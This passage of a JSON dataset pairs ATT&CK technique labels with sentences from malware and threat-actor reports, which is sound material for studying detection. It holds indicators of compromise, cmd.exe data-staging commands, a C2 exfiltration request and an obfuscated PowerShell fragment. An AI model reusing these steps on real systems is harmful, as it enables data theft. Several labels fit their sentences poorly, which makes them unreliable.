      "Wiknet.wikaba.com (192.169.7.250) Wiknet.mooo.com   342a4d93df060289b2d8362461875905 Oct 2018 \u062a\u0633\u0631\u064a\u0628 \u0645\u0646 \u062f\u0627\u062e\u0644 \u0627\u0644\u0642\u0646\u0635\u0644\u064a\u0629 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0629 \u062d\u0648\u0644 \u0645\u0642\u062a\u0644 \u062c\u0645\u0627\u0644 \u062e\u0627\u0634\u0642\u062c\u064a.exe Translation: Leak from the Saudi consulate on the death of Jamal Khashoggi Time-loss.dns05.com (192.169.7.250)   c9cae9026ee2034626e4a43cfdd8b192 Jan 2019 \u0645\u062d\u0636\u0631 \u0627\u062c\u062a\u0645\u0627\u0639 \u0627\u0644\u0633\u0641\u064a\u0631 \u0627\u0644\u0642\u0637\u0631\u064a \u0627\u0644\u0639\u0645\u0627\u062f\u064a \u0645\u0639 \u0627\u0644\u0648\u0641\u062f \u0627\u0644\u0645\u0635\u0631\u064a \u0641\u064a \u0631\u0627\u0645 \u0627\u0644\u0644\u0647 .exe Translation: Minutes of meeting of Qatari Ambassador Emadi with the Egyptian delegation in Ramallah Time-loss.dns05.com (192.169.7.250) dji-msi.2waky.com    Appendix II \u2013 Indicators of compromise    Type IoC Description   RAR md5 E686FFA90B2BFB567547F1C0DAD1AE0B Stage 1 executable / lure   RAR md5 CE5AA4956D4D0D66BED361DDD7DB1A3B Stage 1 executable / lure   RAR md5 4F34902C9F458008BAE26BFA5C1C00DA Stage 1 executable / lure   RAR md5 535F8EA65969A84A68CEAF88778C6176 Stage 1 executable / lure   RAR md5 E8A29C7A6F6C0140152CA8A01E336B37 Stage 1 executable / lure   RAR md5 E782610BF209E81ECC42CA94B9388580 Stage 1 executable / lure   RAR md5 F9BCC21FBB40247167C8C85ED6EF56E3 Stage 1 executable / lure   EXE md5 33369AFD3042326E964139CABA1888D3 Stage 2 executable (19182-exe) that invokes Pastebin chain   EXE md5 2AD88AE20D8F4CB2C74CAE890FEB337A Stage 2 executable (1918-exe) that invokes Pastebin chain   EXE md5 55929FF3E67D79F9E1E205EBD38BC494 Stage 2 executable (21918-exe) that invokes Pastebin chain   EXE md5 DA486DF0D8E03A220808C3BFA5B40D06 Stage 2 executable (Adope-exe) that invokes Pastebin chain   EXE md5 C7F98F890B21C556D16BFF55E33C33AB Stage 2 executable (Application-exe) that invokes Pastebin chain   EXE md5 FAFCC11AF99ACF1B70997BC4BF36CFC0 Stage 2 executable (bind-exe) which is a backdoored Tile Slide Puzzle computer game that invokes Pastebin chain \u2013 code freely available   EXE md5 28CACBF64141F50426830B385AB1BE4C Dell-cmd \u2013 Command string to Delete User Temp directory   EXE md5 F30C00E87C7EE27033DC0AC421F3B4F8 Stage 2 executable (D-exe) that invokes Pastebin chain   EXE md5 51A59AEC24B5046EC4615728A5B52802 Stage 2 executable (Dv-exe) that invokes Pastebin chain   EXE md5 98BDE191AE6E2F7D8D4166C4B21A27D2 Office-vbs \u2013 github.gist lolpoke/system1   EXE md5 9E152A6ADCB57D44284AF3B6FD0C94C2 Stage 2 executable (p0w-exe) that invokes Pastebin chain   EXE md5 CAB62BB5F00FE15683C6AF760C8E8F7E wPic4-exe \u2013 RAT executable similar to Pictures4.exe   EXE md5 192DD65864119017AA307BE3363E31BB Powe1-exe \u2013 executable that uses scheduled tasks to execute VB scripts   EXE md5 71E462260F45C5E621A5F5C9A5724844 WinPeggy4-exe \u2013 backdoored Peggy Bees computer game \u2013 source code available on Microsoft site   EXE md5 AB98768D2440E72F42FCD274806F8D2A WinPeggy-exe \u2013 another variant of WinPeggy4.exe   EXE md5 DAACE673B1F4DFE8A4D3D021C5190483 Word-hta \u2013 VBS code to invoke PowerShell from github.gist..0lol0/system1.ps1   EXE md5 1529AE427FE4EB2D9B4C3073B2AA9E10 Word-vbs \u2013 VBS code to invoke PowerShell from github.gist lolpoke/system1.ps1   Powershell md5 CCD324DF0F606469FCA3D1C6FFA951AD System1.ps1 \u2013 PowerShell script that invoke a binary in memory that uses NETSH commands to allow programs, then execute a Trojan downloaded from myftp[.]biz   Powershell md5 D153FF52AE717D8CF26BEF57BDB7867D Install.ps1 \u2013 PowerShell script that invoke a cobalt strike beacon   EXE md5 AD1C91BF5E7D1F0AAF2E4EFB8FB79ADE Stage 2 executable (res-vbs) that invokes Pastebin chain   EXE md5 EE3AD5B06DBC6CCA7FDC9096697A9B4A Re-vbs \u2013 VBS script that uses Pastebin data to create scheduled task and run JScript to invoke RAT   EXE md5 805CA34E94DA9615C13D8AF48307FB07 Folder.exe \u2013 another RAT variant based on Pastebin chain   EXE md5 F330703C07DDD19226A48DEBA4E8AA08 Stage 2 executable (shell-exe) that invokes Pastebin chain   EXE md5 CFD2178185C40C9E30AADA7E3F667D4B Another RAT variant based on Pastebin chain   EXE md5 C2EE081EC3ADEF4AFACAB1F326EE50FF 2poker2.exe \u2013 use PowerShell command to invoke base64 string from Pastebin and create another RAT variant   EXE md5 B3A472F81F800B32FE6595F44C9BF63B Stage 1 executable / lure   EXE md5 DF3F3AD279CA98F947214FFB3C91C514 Stage 1 executable / lure   EXE md5 221EEF8511169C0496BBC79F96E84A4A Stage 1 executable / lure   EXE md5 62DF4BC3738BE5AD4892200A1DC6B59A Stage 1 executable / lure   EXE md5 55D33D9DA371FDFE7871F2479621444A Stage 1 executable / lure   EXE md5 838696872F924D28B08AAAA67388202E Stage 1 executable / lure   EXE md5 E8BE9843C372D280A506AC260567BF91 Stage 1 executable / lure   EXE md5 55D33D9DA371FDFE7871F2479621444A Stage 1 executable / lure   EXE md5 D9DBB65A42FFE0575F0E99F7498A593E Stage 1 executable / lure   EXE md5 5DB18AB35D29D44DDA109F49D1B99F38 Stage 1 executable / lure   EXE md5 DAE24E4D1DFCDD98F63F7DE861D95182 Stage 1 executable / lure   EXE md5 2358DBB85A29167FA66EE6BF1A7271CD Stage 1 executable / lure   EXE md5 10DFA690662B9C6DB805B95500FC753D Stage 1 executable / lure   EXE md5 6B5946E326488A8C8DA3AAEC2CB6E70F Stage 1 executable / lure   EXE md5 342A4D93DF060289B2D8362461875905 Stage 1 executable / lure   EXE md5 C9CAE9026EE2034626E4A43CFDD8B192 Stage 1 executable / lure   Network dji-msi.2waky.com External C2 domain; rotates with the others over time   Network checktest.www1.biz External C2 domain; rotates with the others over time   Network fulltest.yourtrap.com External C2 domain; rotates with the others over time   Network microsoft10.compress.to External C2 domain; rotates with the others over time   Network mmh.ns02.us External C2 domain; rotates with the others over time   Network ramliktest.mynetav.org External C2 domain; rotates with the others over time   Network testhoward.mysecondarydns.com External C2 domain; rotates with the others over time   Network testmace.compress.to External C2 domain; rotates with the others over time   Network time-loss.dns05.com External C2 domain; rotates with the others over time   Network wiknet.mooo.com External C2 domain; rotates with the others over time   Network Wiknet.wikaba.com External C2 domain; rotates with the others over time   Network supports.mefound.com External C2 domain; rotates with the others over time   Network saso10.myftp.biz External C2 server used by PowerShell scripts to download malware   Network 192.169.7.250 External C2 server (most active)   Network 104.200.67.190 External C2 server (least active)   Network 185.117.72.190 External C2 server (least active)   Network 45.63.97.44 External C2 server (least active)"
    ]
  },
  "timestomp masquerading file deletion data staged-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "masquerading",
      "indicator removal on host: file deletion",
      "data staged"
    ],
    "sentances": [
      "If HWP.exe is found running on the system, the malware finds the currently open file in HWP by extracting the file path from the command-line argument passed to HWP.exe This word file (usually named *.hwp) is copied into the temporary file path  C:\\DOCUME~1\\<username>\\LOCALS~1\\Temp\\2.hwp  hwp is an exact copy of the file loaded into HWP.exe The malware reads the contents of 2.hwp and finds an \u201cMZ magic marker\u201d in the file indicated by the string \u201cJOYBERTM\u201d   Checking for the MZ marker in the HWP file"
    ]
  },
  "system owner/user discovery registry run keys / startup folder data encrypted-multi": {
    "technique_names": [
      "system owner/user discovery",
      "boot or logon autostart execution: registry run keys / startup folder",
      "data encrypted for impact"
    ],
    "sentances": [
      "Any information gathered from the endpoint is first stored in the following file, encrypted, and sent to the control server:  C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  The following information is gathered from the endpoint, stored in the file 1.hwp, and sent to the control server:  Directory listing of the user\u2019s Desktop folder using command:  cmd.exe /c dir C:\\DOCUME~1\\<username>\\Desktop\\ >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  Directory listing of the user\u2019s recently accessed files using command:  cmd.exe /c dir C:\\DOCUME~1\\<username>\\Recent >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  Directory listing of the system\u2019s %programfiles% folder using command:  cmd.exe /c dir C:\\PROGRA~1\\ >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  Systeminfo of the endpoint using command:  cmd.exe /c systeminfo >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  Copies the file ixe000.bin from:  C:\\Documents and Settings\\<username>\\Application Data\\Microsoft\\Windows\\UserProfiles\\ixe000.bin To: C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  Registry key and value information for the current user\u2019s Run key (with information collected):  HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Number of subkeys (<KeyIndex>) <KeyName> Number of Values under each key including the parent Run key (<ValueIndex>) <Value_Name> <Value_Content>  Registry Run key enumeration by Gold Dragon"
    ]
  },
  "data staged data encrypted-multi": {
    "technique_names": ["data staged", "data encrypted for impact"],
    "sentances": [
      "An example of 1.hwp with registry and system information:  Gold Dragon executes these steps executed in the exfiltration process:  Once the malware has gathered the required data from the endpoint, it encrypts the data file 1.hwp using the password \u201cwww[dot]GoldDragon[dot]com\u201d The encrypted content is written to the data file 1.hwp"
    ]
  },
  "standard application layer protocol exfiltration over alternative protocol data encoding data encrypted-multi": {
    "technique_names": [
      "application layer protocol",
      "exfiltration over alternative protocol",
      "data encoding",
      "data encrypted for impact"
    ],
    "sentances": [
      "During the exfiltration process, the malware Base64-encodes the encrypted data and sends it to its control server using an HTTP POST request to the URL:  http://ink[dot]inkboom.co.kr/host/img/jpg/post.php  HTTP data/parameters used in the request include:  Content-Type: multipart/form-data; boundary=\u2014-WebKitFormBoundar ywhpFxMBe19cSjFnG <followed by base64 encoded & encrypted system info> User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322) Accept-Language: en-us HTTP Version: HTTP/1.0    The malware can also download and execute additional components served to it by the control server"
    ]
  },
  "system owner/user discovery remote file copy-multi": {
    "technique_names": ["system owner/user discovery", "ingress tool transfer"],
    "sentances": [
      "The mechanism for downloading additional components is based on the Computer Name and UserName of the endpoint provided by the malware process to the control server in the following HTTP GET request: GET http://ink[dot]inkboom.co.kr/host/img/jpg/download.php?filename=<Computer_Name>_<username>&continue=dnsadmin After successfully retrieving the component from the control server, the next-stage payload is copied to the Application Data directory of the current user and executed: C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\hupdate.ex (note \u201cex,\u201d not \u201cexe\u201d)  The capability to download additional components from the control server"
    ]
  },
  "disabling security tools process discovery-multi": {
    "technique_names": [
      "impair defenses: disable or modify tools",
      "process discovery"
    ],
    "sentances": [
      "The malware demonstrates its evasive behavior by checking for the presence of specific processes related to antimalware products:  The presence of any process with the keywords \u201cv3\u201d and \u201ccleaner.\u201d   Checking for antimalware or cleaner processes"
    ]
  },
  "deobfuscate/decode files or information input capture-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "input capture"
    ],
    "sentances": [
      "From our analysis, stealing keystrokes is the main function of RunningRat; however, the DLL has code for more extensive functionality"
    ]
  },
  "clipboard data file deletion indicator removal on host-multi": {
    "technique_names": [
      "clipboard data",
      "indicator removal on host: file deletion",
      "indicator removal on host"
    ],
    "sentances": [
      "Code is included to copy the clipboard, delete files, compress files, clear event logs, shut down the machine, and much more"
    ]
  },
  "security software discovery hidden files and directories-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "hide artifacts: hidden files and directories"
    ],
    "sentances": [
      "For more information related to HIDDEN COBRA activity, go to https://www.us-cert.gov/hiddencobra.If users or administrators detect the custom tools indicative of HIDDEN COBRA, these tools should be immediately flagged, reported to the DHS National Cybersecurity Communications and Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and given highest priority for enhanced mitigation"
    ]
  },
  "security software discovery remote system discovery-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "remote system discovery"
    ],
    "sentances": [
      "Cyber analysts are encouraged to review the information provided in this alert to detect signs of malicious network activity.Tools and capabilities used by HIDDEN COBRA actors include DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware",
      "While the seller specifies that HawkEye Reborn should only be used on systems with permission, they also explicitly forbid scanning of HawkEye Reborn executables using antivirus software, likely an attempt to minimize the likelihood that anti-malware solutions will detect HawkEye Reborn binaries.Following these changes, the new developer of HawkEye Reborn has continued to make changes and we expect this to continue as long as the developer can monetize their efforts.As with other malware that we wrote about last year, while the developer claims that the software should only be used on systems with permission, or \"for educational purposes,\" malicious attackers have been continuously leveraging it against various targets around the world.Distribution campaignsFor several months during the last half of 2018 and continuing into 2019, Cisco Talos has observed ongoing malicious email campaigns that are being used to distribute versions of the HawkEye Reborn keylogger/stealer"
    ]
  },
  "system network configuration discovery hidden files and directories remote system discovery network service scanning windows admin shares-multi": {
    "technique_names": [
      "system network configuration discovery",
      "hide artifacts: hidden files and directories",
      "remote system discovery",
      "network service discovery",
      "remote services: smb/windows admin shares"
    ],
    "sentances": [
      "Additionally, the appendices of this report provide network signatures to aid in the detection and mitigation of HIDDEN COBRA activity.Network Signatures and Host-Based RulesThis section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors"
    ]
  },
  "security software discovery disabling security tools indicator removal on host powershell-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "impair defenses: disable or modify tools",
      "indicator removal on host",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "Failed login activity can be indicative of failed intrusion activity.If remote access between zones is an unavoidable business need, log and monitor these connections closely.In environments with a high risk of interception or intrusion, organizations should consider supplementing password authentication with other forms of authentication such as challenge/response or multifactor authentication using biometric or physical tokens.Logging PracticesSystem operators should follow these secure logging practices.Ensure event logging, including applications, events, login activities, and security attributes, is turned on or monitored for identification of security issues.Configure network logs to provide adequate information to assist in quickly developing an accurate determination of a security incident.Upgrade PowerShell to new versions with enhanced logging features and monitor the logs to detect usage of PowerShell commands, which are often malware-related.Secure logs in a centralized location and protect them from modification.Prepare an incident response plan that can be rapidly administered in case of a cyber intrusion"
    ]
  },
  "clipboard data masquerading user execution exfiltration over alternative protocol data encoding data encrypted-multi": {
    "technique_names": [
      "clipboard data",
      "masquerading",
      "user execution",
      "exfiltration over alternative protocol",
      "data encoding",
      "data encrypted for impact"
    ],
    "sentances": [
      "Based on packet capture analysis of previous implants from 2017, the following strings are used in control server communications:  Connection: keep-alive Cache-Control: max-age=0 Accept: */* Content-Type: multipart/form-data; boundary= Content-Type: application/octet-stream Accept-Encoding: gzip,deflate,sdch Accept-Language: ko-KR -> Korean  Content-Disposition: form-data;name=\u201dboard_id\u201d Content-Disposition: form-data;name=\u201duser_id\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dimg01_29.jpg\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dmy.doc\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dpratice.pdf\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dking.jpg\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201ddream.avi\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dhp01.avi\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dstar.avi\u201d  User Agents The implant either fetches the user agent from Internet Explorer (using ObtainUserAgentAsString()) or uses a default user agent specified in the malware binary: Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36 Control Server Communications The malware initiates communication with the control server by sending it an HTTP POST request with additional optional HTTP data, such as: ------FormBoundary<randomly_generated_characters> Content-Disposition: form-data; name=\"board_id\"  8306 ------FormBoundary<randomly_generated_characters> Content-Disposition: form-data; name=\"user_id\"  *dJU!*JE&!M@UNQ@ ------FormBoundary<randomly_generated_characters> Content-Disposition: form-data; name=\"file1\"; filename=\"king.jpg\" Content-Type: application/octet-stream  board_id is a four-digit number that may be an identifier for a campaign ID"
    ]
  },
  "timestomp data staged exfiltration over command and control channel-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "data staged",
      "exfiltration over c2 channel"
    ],
    "sentances": [
      "Create processes Write responses from the control server to a file Send information for all drives Write data sent by the control server to a temporary file matching the file path pattern %temp%\\DWS00* Change the time of a file as specified by the control server  The malware changing the file time"
    ]
  },
  "process injection process discovery system time discovery-multi": {
    "technique_names": [
      "process injection",
      "process discovery",
      "system time discovery"
    ],
    "sentances": [
      "Gather the process time for all processes  Getting time information for all processes running on the system"
    ]
  },
  "timestomp exfiltration over command and control channel-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "exfiltration over c2 channel"
    ],
    "sentances": [
      "Read a specified file\u2019s contents and send the data to the control server Write data sent by the control server to an existing file Mark a file to be deleted on reboot  Marking a file for deletion on reboot"
    ]
  },
  "use alternate authentication material: pass the hash": [
    "A code comparison of hash 12c786c490366727cf7279fc141921d8 with hash 6de6a0df263ecd2d71a92597b2362f2c (from November 28, 2017).\u00a0 Conclusion We have found what may be an early data-gathering stage for future possible heists from financial organizations in Turkey (and possibly other countries)",
    "Adversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)"
  ],
  "custom cryptographic protocol exploitation for privilege escalation-multi": {
    "technique_names": [
      "encrypted channel",
      "exploitation for privilege escalation"
    ],
    "sentances": [
      "Public    TURNEDUP  Backdoor capable of uploading and downloading files, creating a reverse shell, taking screenshots, and gathering system information  Non-Public   Indicators of Compromise APT33 Domains Likely Used in Initial Targeting    Domain    boeing.servehttp[.]com    alsalam.ddns[.]net    ngaaksa.ddns[.]net    ngaaksa.sytes[.]net    vinnellarabia.myftp[.]org   APT33 Domains / IPs Used for C2    C2 Domain  MALWARE    managehelpdesk[.]com  NANOCORE    microsoftupdated[.]com  NANOCORE    osupd[.]com  NANOCORE    mywinnetwork.ddns[.]net  NETWIRE    www.chromup[.]com  TURNEDUP    www.securityupdated[.]com  TURNEDUP    googlmail[.]net  TURNEDUP    microsoftupdated[.]net  TURNEDUP    syn.broadcaster[.]rocks  TURNEDUP    www.googlmail[.]net  TURNEDUP   Publicly Available Tools used by APT33    MD5  MALWARE  Compile Time (UTC)    3f5329cf2a829f8840ba6a903f17a1bf  NANOCORE  2017/1/11 2:20    10f58774cd52f71cd4438547c39b1aa7  NANOCORE  2016/3/9 23:48    663c18cfcedd90a3c91a09478f1e91bc  NETWIRE  2016/6/29 13:44    6f1d5c57b3b415edc3767b079999dd50  NETWIRE  2016/5/29 14:11   Unattributed DROPSHOT / SHAPESHIFT MD5 Hashes     MD5   MALWARE   Compile Time (UTC)    0ccc9ec82f1d44c243329014b82d3125  DROPSHOT (drops SHAPESHIFT  n/a - timestomped    fb21f3cea1aa051ba2a45e75d46b98b8  DROPSHOT  n/a - timestomped    3e8a4d654d5baa99f8913d8e2bd8a184  SHAPESHIFT  2016/11/14 21:16:40    6b41980aa6966dda6c3f68aeeb9ae2e0  SHAPESHIFT  2016/11/14 21:16:40   APT33 Malware MD5 Hashes    MD5  MALWARE  Compile Time (UTC)    8e67f4c98754a2373a49eaf53425d79a  DROPSHOT (drops TURNEDUP)  2016/10/19 14:26    c57c5529d91cffef3ec8dadf61c5ffb2  TURNEDUP  2014/6/1 11:01    c02689449a4ce73ec79a52595ab590f6  TURNEDUP  2016/9/18 10:50    59d0d27360c9534d55596891049eb3ef  TURNEDUP  2016/3/8 12:34    59d0d27360c9534d55596891049eb3ef  TURNEDUP  2016/3/8 12:34    797bc06d3e0f5891591b68885d99b4e1  TURNEDUP  2015/3/12 5:59    8e6d5ef3f6912a7c49f8eb6a71e18ee2  TURNEDUP  2015/3/12 5:59    32a9a9aa9a81be6186937b99e04ad4be  TURNEDUP  2015/3/12 5:59    a272326cb5f0b73eb9a42c9e629a0fd8  TURNEDUP  2015/3/9 16:56    a813dd6b81db331f10efaf1173f1da5d  TURNEDUP  2015/3/9 16:56    de9e3b4124292b4fba0c5284155fa317  TURNEDUP  2015/3/9 16:56    a272326cb5f0b73eb9a42c9e629a0fd8  TURNEDUP  2015/3/9 16:56    b3d73364995815d78f6d66101e718837  TURNEDUP  2014/6/1 11:01    de7a44518d67b13cda535474ffedf36b  TURNEDUP  2014/6/1 11:01    b5f69841bf4e0e96a99aa811b52d0e90  TURNEDUP  2014/6/1 11:01    a2af2e6bbb6551ddf09f0a7204b5952e  TURNEDUP  2014/6/1 11:01    b189b21aafd206625e6c4e4a42c8ba76  TURNEDUP  2014/6/1 11:01    aa63b16b6bf326dd3b4e82ffad4c1338  TURNEDUP  2014/6/1 11:01    c55b002ae9db4dbb2992f7ef0fbc86cb  TURNEDUP  2014/6/1 11:01    c2d472bdb8b98ed83cc8ded68a79c425  TURNEDUP  2014/6/1 11:01    c6f2f502ad268248d6c0087a2538cad0  TURNEDUP  2014/6/1 11:01    c66422d3a9ebe5f323d29a7be76bc57a  TURNEDUP  2014/6/1 11:01    ae47d53fe8ced620e9969cea58e87d9a  TURNEDUP  2014/6/1 11:01    b12faab84e2140dfa5852411c91a3474  TURNEDUP  2014/6/1 11:01    c2fbb3ac76b0839e0a744ad8bdddba0e  TURNEDUP  2014/6/1 11:01    a80c7ce33769ada7b4d56733d02afbe5  TURNEDUP  2014/6/1 11:01    6a0f07e322d3b7bc88e2468f9e4b861b  TURNEDUP  2014/6/1 11:01    b681aa600be5e3ca550d4ff4c884dc3d  TURNEDUP  2014/6/1 11:01    ae870c46f3b8f44e576ffa1528c3ea37  TURNEDUP  2014/6/1 11:01    bbdd6bb2e8827e64cd1a440e05c0d537  TURNEDUP  2014/6/1 11:01    0753857710dcf96b950e07df9cdf7911  TURNEDUP  2013/4/10 10:43    d01781f1246fd1b64e09170bd6600fe1  TURNEDUP  2013/4/10 10:43    1381148d543c0de493b13ba8ca17c14f  TURNEDUP  2013/4/10 10:43"
    ]
  },
  "standard application layer protocol remote file copy-multi": {
    "technique_names": ["application layer protocol", "ingress tool transfer"],
    "sentances": [
      "Previously the fake website linked to the following documents in a third fake Oxford domain, oxford[.]in: http://oxford[.]in/downloads/ls1.doc http://oxford[.]in/downloads/ls2.doc http://oxford[.]in/downloads/ls3.doc http://oxford[.]in/downloads/ls4.do The documents were unavailable during our research, and their content is unknown to us",
      "The Trojan will respond to the C2 to notify it of a successful upload by sending a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(\u201cFile Uploaded\u201d)> The download command (3) reads the contents of a specified file and sends the data to the C2 server"
    ]
  },
  "system network configuration discovery web service-multi": {
    "technique_names": [
      "system network configuration discovery",
      "web service"
    ],
    "sentances": [
      "Backdoor.Remexi, one of the malware in use by Chafer, had the following \u00a0command and control\u00a0host: 87pqxz159.dockerjsbin[.]com Interestingly, IP address \u00a083.142.230.138, which\u00a0serve as a\u00a0command and control address for an OilRig related sample (3a5fcba80c1fd685c4b5085d9d474118), was pointed to by\u00a087pqxz159.dockerjsbin[.]com as well"
    ]
  },
  "spearphishing attachment user execution-multi": {
    "technique_names": ["phishing: spearphishing attachment", "user execution"],
    "sentances": [
      "One such email that we were able to obtain was targeting users in Turkey, as shown in Figure 4:    Figure 4: Sample spear phishing email containing macro-based document attachment The malicious Microsoft Office attachments that we observed appear to have been specially crafted for individuals in four countries: Turkey, Pakistan, Tajikistan and India"
    ]
  },
  "deobfuscate/decode files or information scripting-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "command and scripting interpreter"
    ],
    "sentances": [
      "Indirect Code Execution Through INF and SCT This scriptlet code execution technique leveraging INF and SCT files was recently discovered and documented in February 2018"
    ]
  },
  "custom cryptographic protocol obfuscated files or information-multi": {
    "technique_names": ["encrypted channel", "obfuscated files or information"],
    "sentances": [
      "Some of the instances used in this script are: $eNv:puBLic[13]+$ENv:pUBLIc[5]+'x' ($ENV:cOMsPEC[4,26,25]-jOin'')      XOR encoding: The biggest section of the PowerShell script is XOR encoded using a single byte key, as shown in Figure 11",
      "If there are keys for the string encryption with the XOR algorithm, the configuration data will be also encrypted with the XOR algorithm",
      "Strings in the backdoor are encrypted using a custom algorithm that uses XOR with a 4-byte key"
    ]
  },
  "custom cryptographic protocol connection proxy-multi": {
    "technique_names": ["encrypted channel", "proxy"],
    "sentances": [
      "Figure 12: DrAGon_MidDLe stores the list of proxy URLs used to interact with C2 server Section 2 The second section of the PowerShell script has the ability to perform encryption and decryption of messages that are exchanged between the system and the C2 server"
    ]
  },
  "execution through api deobfuscate/decode files or information command-line interface-multi": {
    "technique_names": [
      "native api",
      "deobfuscate/decode files or information",
      "command and scripting interpreter"
    ],
    "sentances": [
      "Several techniques are employed for executing the PowerShell code: If command starts with \u201cexcel\u201d, then it leverages DDEInitiate Method of Excel.Appilcation to execute the code:\u00a0 If the command starts with\u00a0\u201coutlook\u201d, then it leverages Outlook.Application and MSHTA to execute the code:\u00a0 If the command starts with \u201crisk\u201d, then execution is performed through DCOM object:\u00a0     File upload functionality"
    ]
  },
  "screen capture system information discovery scheduled task execution through api deobfuscate/decode files or information-multi": {
    "technique_names": [
      "screen capture",
      "system information discovery",
      "scheduled task/job",
      "native api",
      "deobfuscate/decode files or information"
    ],
    "sentances": [
      "C2 Command   Purpose    reboot  Reboot the system using shutdown command    shutdown  Shut down the system using shutdown command    clean  Wipe the Drives, C:\\, D:\\, E:\\, F:\\    screenshot  Take a screenshot of the System    upload  Encrypt and upload the information from the system    excel  Leverage Excel.Application COM object for code execution    outlook  Leverage Outlook.Application COM object for code execution    risk  Leverage DCOM object for code execution   Conclusion This activity shows us that TEMP.Zagros stays up-to-date with the latest code execution and persistence mechanism techniques, and that they can quickly leverage these techniques to update their malware"
    ]
  },
  "spearphishing link system service discovery binary padding account discovery file and directory discovery exploitation for client execution fallback channels windows admin shares-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "system service discovery",
      "obfuscated files or information: binary padding",
      "account discovery",
      "file and directory discovery",
      "exploitation for client execution",
      "fallback channels",
      "remote services: smb/windows admin shares"
    ],
    "sentances": [
      ".doc  Turkey    009cc0f34f60467552ef79c3892c501043c972be55fe936efb30584975d45ec0  idrbt.doc  \u00a0  India    18479a93fc2d5acd7d71d596f27a5834b2b236b44219bb08f6ca06cf760b74f6  T\u00fcrkiye Cumhuriyeti Kimlik Kart\u0131.doc  Turkey    3da24cd3af9a383b731ce178b03c68a813ab30f4c7c8dfbc823a32816b9406fb  Turkish Armed Forces.doc  \u00a0  Turkey    9038ba1b7991ff38b802f28c0e006d12d466a8e374d2f2a83a039aabcbe76f5c  na.gov.pk.doc  \u00a0  Pakistan    3b1d8dcbc8072b1ec10f5300c3ea9bb20db71bd8fa443d97332790b74584a115  MVD-FORM-1800.doc  Tajikistan    cee801b7a901eb69cd166325ed3770daffcd9edd8113a961a94c8b9ddf318c88  KEGM-CyberAttack.doc  Turkey    1ee9649a2f9b2c8e0df318519e2f8b4641fd790a118445d7a0c0b3c02b1ba942  IL-1801.doc  Turkey    aa60c1fae6a0ef3b9863f710e46f0a7407cf0feffa240b9a4661a4e8884ac627  kiyiemniyeti.doc  Turkey    93745a6605a77f149471b41bd9027390c91373558f62058a7333eb72a26faf84  TCELL-S1-M.doc  Tajikistan    c87799cce6d65158da97aa31a5160a0a6b6dd5a89dea312604cc66ed5e976cc9  egm-1.doc  Turkey    2cea0b740f338c513a6390e7951ff3371f44c7c928abf14675b49358a03a5d13  Connectel .pk.doc  Pakistan    18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd  g\u00c3\u0178venlik_y\u00c3\u0153nergesi_.doc  Turkey    153117aa54492ca955b540ac0a8c21c1be98e9f7dd8636a36d73581ec1ddcf58  MIT.doc  Turkey    d07d4e71927cab4f251bcc216f560674c5fb783add9c9f956d3fc457153be025  Gvenlik Ynergesi.doc  Turkey    af5f102f0597db9f5e98068724e31d68b8f7c23baeea536790c50db587421102  Gvenlik Ynergesi.doc  Turkey    5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af  NA  Turkey    3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c  Anadolu G\u00c3\u00bcneydo\u00c4\u0178u Projesinde .doc  Turkey   Network Indicators List of Proxy URLs hxxp://alessandrofoglino[.]com//db_template.php hxxp://www.easy-home-sales[.]co.za//db_template.php hxxp://www.almaarefut[.]com/admin/db_template.php hxxp://chinamall[.]co.za//db_template.php 